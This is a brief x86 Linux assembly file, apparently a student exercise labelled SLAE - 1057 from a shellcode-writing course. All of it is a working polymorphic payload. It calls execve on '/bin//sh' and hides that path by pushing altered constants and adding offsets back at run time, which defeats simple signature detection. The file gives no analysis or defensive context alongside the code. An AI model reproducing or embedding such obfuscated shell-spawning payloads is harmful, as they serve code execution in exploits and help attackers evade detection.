;SLAE - 1057
global _start

section .text
extern exit
_start:
	push	0x0b
	pop	eax
	cdq	
	push 	edx
	mov	ecx,edx
	push 	dword 0x5DB6503E   ; PUSH hs// into stack
	add 	dword[esp],0xabcdef1
        push 	dword 0x6C6A8575   ; PUSH nib/ into stack
	add	dword[esp],0x1fedcba
	mov    	ebx,esp
	int    0x80
